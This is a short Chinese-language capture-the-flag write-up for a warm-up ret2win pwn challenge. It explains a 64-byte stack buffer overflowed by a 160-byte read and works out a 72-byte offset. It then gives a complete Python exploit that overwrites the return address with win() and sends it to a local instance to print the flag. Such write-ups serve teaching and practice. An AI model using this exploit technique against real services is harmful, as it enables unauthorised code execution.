# Pwn 题解：ret2win 热身

## 解法

先分析附件 `challenge.bin`：

```bash
checksec --file=challenge.bin
nm -an challenge.bin | awk '/ win$/ {print "0x"$1}'
```

这是最基础的 `ret2win`。程序里 `name[64]` 被 `read(..., 160)` 溢出，因此偏移就是：

- `64` 字节缓冲区
- `8` 字节 saved rbp
- 下一跳就是返回地址

也就是 `72` 字节。

从附件里取到 `win()` 地址后，构造 payload：

```bash
python3 - <<'PY' "$(nm -an challenge.bin | awk '/ win$/ {print "0x"$1}')"
import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = 18080
WIN = int(sys.argv[1], 16)

payload = b"A" * 72 + struct.pack("<Q", WIN)

with socket.create_connection((HOST, PORT), timeout=3) as sock:
    banner = b""
    while b"What is your name?" not in banner:
        chunk = sock.recv(4096)
        if not chunk:
            break
        banner += chunk
    sock.sendall(payload)
    sock.shutdown(socket.SHUT_WR)
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        print(chunk.decode(errors="replace"), end="")
PY
```

把它送到实例服务后，流程会直接跳到 `win()`，输出动态 Flag。
